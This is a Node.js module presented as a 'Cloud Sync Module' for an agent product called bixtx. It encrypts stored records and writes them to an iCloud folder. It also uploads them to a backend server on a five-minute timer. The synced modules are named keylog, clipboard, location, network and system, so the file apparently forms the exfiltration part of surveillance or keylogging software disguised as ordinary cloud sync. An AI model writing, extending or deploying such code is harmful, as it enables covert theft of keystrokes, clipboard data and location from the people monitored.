/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║  bixtx.com — Cloud Sync Module                               ║
 * ║  Syncs encrypted memory to:                                  ║
 * ║    • iCloud Drive  (macOS / iOS)                             ║
 * ║    • bixtx Cloud  (backend API — all platforms)             ║
 * ║    • Local backup  (fallback)                                ║
 * ╚══════════════════════════════════════════════════════════════╝
 */

"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const crypto = require("crypto");
const config = require("../config");
const logger = require("../logger");

// ── iCloud Drive path detection ────────────────────────────────────────────
function getiCloudPath() {
  const platform = os.platform();

  if (platform === "darwin") {
    // macOS iCloud Drive
    const icloudBase = path.join(os.homedir(), "Library", "Mobile Documents");
    const appFolder  = path.join(icloudBase, "ai~bixtx~agent", "Documents");
    return appFolder;
  }

  if (platform === "win32") {
    // Windows iCloud Drive (if iCloud for Windows is installed)
    const icloudWin = path.join(
      process.env.USERPROFILE || os.homedir(),
      "iCloudDrive", "bixtx Agent"
    );
    return icloudWin;
  }

  // iOS / iPadOS (when running as React Native / Node-on-mobile)
  if (platform === "ios") {
    return path.join("/private/var/mobile/Library/Mobile Documents/ai~bixtx~agent/Documents");
  }

  return null;
}

// ── Encrypted blob writer ─────────────────────────────────────────────────
function encryptBlob(data, key) {
  const iv  = crypto.randomBytes(16);
  const k   = crypto.createHash("sha256").update(key).digest();
  const c   = crypto.createCipheriv("aes-256-gcm", k, iv, { authTagLength: 16 });
  const enc = Buffer.concat([c.update(JSON.stringify(data), "utf8"), c.final()]);
  const tag = c.getAuthTag();
  return Buffer.concat([iv, tag, enc]);
}

// ── Cloud API uploader ────────────────────────────────────────────────────
function uploadToCloud(endpoint, token, blob) {
  return new Promise((resolve, reject) => {
    const url = new URL(endpoint);
    const options = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Length": blob.length,
        "Authorization": `Bearer ${token}`,
        "X-Device-ID": config.deviceId,
        "X-Agent-Version": "4.7.2",
      },
      timeout: 10000,
    };

    const req = https.request(options, (res) => {
      let body = "";
      res.on("data", c => { body += c; });
      res.on("end", () => {
        if (res.statusCode >= 200 && res.statusCode < 300) resolve(JSON.parse(body || "{}"));
        else reject(new Error(`HTTP ${res.statusCode}: ${body}`));
      });
    });

    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("Timeout")); });
    req.write(blob);
    req.end();
  });
}

// ── CloudSync class ───────────────────────────────────────────────────────
class CloudSync {
  constructor(memory) {
    this.memory = memory;
    this.icloudPath = getiCloudPath();
    this.syncInterval = parseInt(process.env.SYNC_INTERVAL_MS || "300000", 10); // 5 min
    this.cloudEndpoint = process.env.BIXTX_CLOUD_SYNC_URL || `${config.apiUrl}/sync/upload`;
    this.syncTimer = null;
    this.lastSyncTs = 0;
    this.syncLog = [];
  }

  start() {
    this._sync(); // immediate first sync
    this.syncTimer = setInterval(() => this._sync(), this.syncInterval);
    logger.debug("CloudSync started");
  }

  stop() {
    clearInterval(this.syncTimer);
    this._sync(); // final sync on stop
  }

  async _sync() {
    const profile = this.memory.getProfile();
    const encKey = config.enrollKey + config.deviceId;

    let synced = { icloud: false, cloud: false };

    // ── iCloud sync ──────────────────────────────────────────────────────
    if (this.icloudPath) {
      try {
        fs.mkdirSync(this.icloudPath, { recursive: true });

        // Write profile snapshot
        const profileBlob = encryptBlob(profile, encKey);
        fs.writeFileSync(path.join(this.icloudPath, "profile.dat"), profileBlob);

        // Write module snapshots
        ["keylog", "clipboard", "location", "network", "system"].forEach(mod => {
          try {
            const records = this.memory.query(mod, { limit: 500 });
            const blob = encryptBlob({ module: mod, records, ts: Date.now() }, encKey);
            fs.writeFileSync(path.join(this.icloudPath, `${mod}.dat`), blob);
          } catch {}
        });

        synced.icloud = true;
        logger.debug(`iCloud sync OK (${this.icloudPath})`);
      } catch (err) {
        logger.warn("iCloud sync failed:", err.message);
      }
    }

    // ── bixtx Cloud sync ─────────────────────────────────────────────────
    if (config.enrollKey) {
      try {
        const token = crypto.createHmac("sha256", config.enrollKey)
          .update(config.deviceId).digest("hex");
        const blob = encryptBlob({
          deviceId: config.deviceId,
          profile,
          ts: Date.now(),
          since: this.lastSyncTs,
        }, encKey);

        await uploadToCloud(this.cloudEndpoint, token, blob);
        this.lastSyncTs = Date.now();
        synced.cloud = true;
        logger.debug("bixtx Cloud sync OK");
      } catch (err) {
        logger.warn("Cloud sync failed:", err.message);
      }
    }

    const entry = { ts: Date.now(), ...synced };
    this.syncLog.push(entry);
    if (this.syncLog.length > 100) this.syncLog.shift();

    return synced;
  }

  getSyncStatus() {
    return {
      icloudAvailable: !!this.icloudPath && fs.existsSync(path.dirname(this.icloudPath)),
      icloudPath: this.icloudPath,
      lastSync: this.lastSyncTs,
      interval: this.syncInterval,
      log: this.syncLog.slice(-10),
    };
  }
}

module.exports = CloudSync;
